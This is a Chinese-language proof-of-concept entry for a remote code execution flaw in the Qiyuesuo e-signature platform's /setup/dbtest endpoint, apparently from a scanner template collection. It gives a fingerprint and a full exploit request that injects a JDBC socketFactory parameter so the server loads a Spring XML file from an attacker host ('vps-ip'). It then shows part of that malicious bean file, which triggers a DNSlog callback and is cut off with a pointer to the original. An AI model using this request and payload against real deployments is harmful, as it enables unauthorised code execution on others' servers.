# 契约锁dbtest存在远程代码执行漏洞

- **系统**：契约锁　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app=契约锁-电子签署平台`
- **请求**：`GET /setup/dbtest?db=POSTGRESQL&host=localhost&port=5511&username=root&name=test%2F%3FsocketFactory%3Dorg%2Espringframework%2Econtext%2Esupport%2EClassPathXmlApplicationContext%26socketFactoryArg%3Dhttp%3A%2F%2Fvps-ip%2F1%2Exml HTTP/1.1`
- **关键头**：`id: qiYueSuo-dbtest-CodeExecution`　`name: qiYueSuo-dbtest-CodeExecution`　`author: AA`　`severity: critical`

**请求体 / payload**
```
准备1.xml文件，内容如下：
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:p="http://www.springframework.org/schema/p"
xsi:schemaLocation="http://www.springframework.org/schema/beans
[http://www.springframework.org/schema/beans/spring-beans.xsd">](http://www.springframework.org/schema/beans/spring-beans.xsd%22%3E)
<bean id="dnslogDomain" class="java.lang.String">
<constructor-arg value="222.6tg3y8z7.dnslog.cn"/>
</bean>
<bean id="dnsQuery" class="java.net.InetAddress" factory-method="getByName">
<constructor-arg ref="dnslogDomain"/>
<…（脚本共 1199 字，完整版见原文）
```
- **预期**：200　|　—